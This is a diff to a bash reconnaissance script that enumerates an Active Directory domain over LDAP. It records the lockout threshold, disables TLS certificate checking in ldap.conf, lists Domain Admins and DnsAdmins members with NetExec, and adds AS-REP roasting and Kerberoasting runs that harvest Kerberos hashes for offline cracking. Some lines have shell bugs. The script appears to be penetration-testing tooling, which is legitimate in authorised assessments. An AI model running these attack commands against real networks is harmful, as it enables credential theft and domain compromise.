@@ -42,18 +42,22 @@ if [ grep -qE "^(53,)+|(,53,)|(,53$)" port-list.txt ]; then
 		echo "LDAP Root Domain Naming Context: $base_dn" >> ldap-recon.txt
 		
 		if [ ! -z $user ] && [ ! -z $password ]; then
-				## TODO: query lockoutThreshold
 				if [ -z $domain ]; then
 					$domain=$ldap_domain_name
 				fi
-				#ldapsearch -H <ldap_server> -D <bind_dn> -w <bind_password> -b "dc=example,dc=com" "(&(objectClass=user)(sAMAccountName=<username>)(lockoutTime>=0))"
-				#(&(objectClass=user)(sAMAccountName=username)(badPwdCount>5))
+
 				if [ ! grep -q "TLS_REQCERT allow" /etc/ldap/ldap.conf ]; then
 					sudo tee -a "TLS_REQCERT allow" >> /etc/ldap/ldap.conf
 				fi
 				## confirm that SLDAP is enabled and required
-				ldapsearch -D '$domain\$user' -w '$password' -h ldaps://$target -b "$base_dn" | grep lockoutThreshold
+				ldap_lockout_threshold=$(ldapsearch -D '$domain\$user' -w '$password' -h ldaps://$target -b "$base_dn" | grep -m 1 lockoutThreshold | cut -d ':' -f 2)
+				echo "LDAP Lockout Threshold: $ldap_lockout_threshold" >> ldap-recon.txt
+
+				#ldapsearch -H <ldap_server> -D <bind_dn> -w <bind_password> -b "dc=example,dc=com" "(&(objectClass=user)(sAMAccountName=<username>)(lockoutTime>=0))"
+				#(&(objectClass=user)(sAMAccountName=username)(badPwdCount>5))
+				
 				# TODO: Run windapsearch -o windapsearch-recon.txt
+				
 				# Run NetExec
                 echo "[*] Running nxc LDAP enum with credentials $user:****** (nxc-recon.txt)"
                 # clear the file and output the scan timestamp
@@ -70,8 +74,14 @@ if [ grep -qE "^(53,)+|(,53,)|(,53$)" port-list.txt ]; then
 				nxc ldap $target -u $user -p $password -M group-mem -o GROUP="Domain Admins" >> nxc-recon.txt
 				echo "NXC DnsAdmins:" >> nxc-recon.txt
 				nxc ldap $target -u $user -p $password -M group-mem -o GROUP="DnsAdmins" >> nxc-recon.txt
+				truncate -s 0 nxc-aspreproast-output.txt
+				echo "NXC AS-REP Roasting in nxc-aspreproast-output.txt" >> nxc-recon.txt
+				nxc ldap $target -u $user -p $password --asreproast nxc-aspreproast-output.txt
+				truncate -s 0 nxc-krbroast-output.txt
+				echo "NXC Kerberoasting in nxc-krbroast-output.txt" >> nxc-recon.txt
+				nxc ldap $target -u $user -p $password --kerberoasting nxc-krbroast-output.txt
         else
-                #Run ldapsearch, Run windapsearch, Run NetExec	
+                #Run ldapsearch, Run windapsearch, Run NetExec
                 echo "Running unauthenticated LDAP enum"
         fi
         echo "[*] LDAP module complete."
